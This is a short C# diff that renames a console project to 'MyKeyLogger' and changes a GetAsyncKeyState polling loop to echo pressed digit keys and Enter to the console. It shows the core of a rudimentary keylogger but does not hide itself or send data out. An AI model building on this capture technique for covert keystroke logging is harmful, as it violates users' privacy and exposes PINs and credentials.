@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-namespace ConsoleApp6
+namespace MyKeyLogger
 {
     class Program
     {
@@ -20,7 +20,7 @@ namespace ConsoleApp6
 
                 for (int i = '0'; i <= '9'; i++)
                     if (GetAsyncKeyState(i) == -32767)
-                        Console.WriteLine((char)i + " " + i + " " + GetAsyncKeyState(i));
+                        Console.Write((char)i);
                 if (GetAsyncKeyState(13) == -32767)
                     Console.WriteLine();
             }
